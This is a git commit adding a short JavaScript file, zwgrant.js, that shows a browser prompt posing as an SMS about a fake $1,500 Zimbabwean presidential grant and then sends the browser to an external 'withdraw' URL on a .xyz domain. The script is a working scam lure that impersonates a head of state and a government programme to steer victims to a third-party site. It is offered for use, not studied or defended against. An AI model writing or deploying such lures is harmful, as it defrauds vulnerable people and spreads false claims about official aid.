7da4e5aefdf7209319d46e7d8972ee49c6968006
bigetijazz32 <bigetijazz32@gmail.com>
2025-07-08 11:43:23 +0100

    Create zwgrant.js

---
+++ zwgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW $1,500'
+password=prompt('SMS: Hello dear, President Emmerson Mnangagwa $1,500 Grant to support zimbabwaens is ongoing. to WITHDRAW $1,500, press Ok to verify now','WITHDRAW $1,500');
+if (password != 'WITHDRAW $1,500') {
+location.href='https://www.udwang.xyz/withdraw-USD1500';
+}
